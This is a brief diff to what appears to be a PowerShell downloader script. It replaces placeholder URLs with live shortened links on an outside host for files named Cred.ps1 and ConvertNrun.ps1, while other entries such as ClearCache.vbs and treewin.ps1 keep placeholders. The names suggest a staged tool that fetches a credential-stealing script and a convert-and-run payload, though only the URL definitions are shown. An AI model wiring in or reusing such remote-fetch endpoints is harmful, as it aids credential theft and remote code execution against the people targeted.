@@ -1,6 +1,6 @@
 # Define the URLs of the files to download
-$url1 = "change url" # Cred.ps1
-$url2 = "change url" # ConvertNrun.ps1
+$url1 = "https://lnkfwd.com/u/LPWEPwX9" # Cred.ps1
+$url2 = "https://lnkfwd.com/u/LPWN97hU" # ConvertNrun.ps1
 $url3 = 'change url' # RAMMap.txt
 $url4 = 'change url' # ClearCache.vbs
 $url5 = 'change url' # treewin.ps1
